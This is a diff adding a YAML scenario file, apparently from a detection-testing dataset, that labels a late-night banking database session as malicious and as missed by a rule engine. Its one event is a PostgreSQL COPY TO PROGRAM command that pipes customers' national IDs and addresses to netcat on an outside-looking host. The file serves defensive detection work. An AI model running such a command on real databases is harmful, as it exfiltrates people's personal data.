@@ -1,0 +1,30 @@
+scenario_id: gen_banking_97_copy_to_program_mal_2767m
+family_id: gen_banking_97_copy_to_program_fam_2767
+domain: banking
+time_of_day: 02:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'nc warehouse.corp
+      443'
+    connects_to:
+      ip: 192.168.29.91
+      port: 5432
+matched_pair_id: gen_banking_97_copy_to_program_pair_2767
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
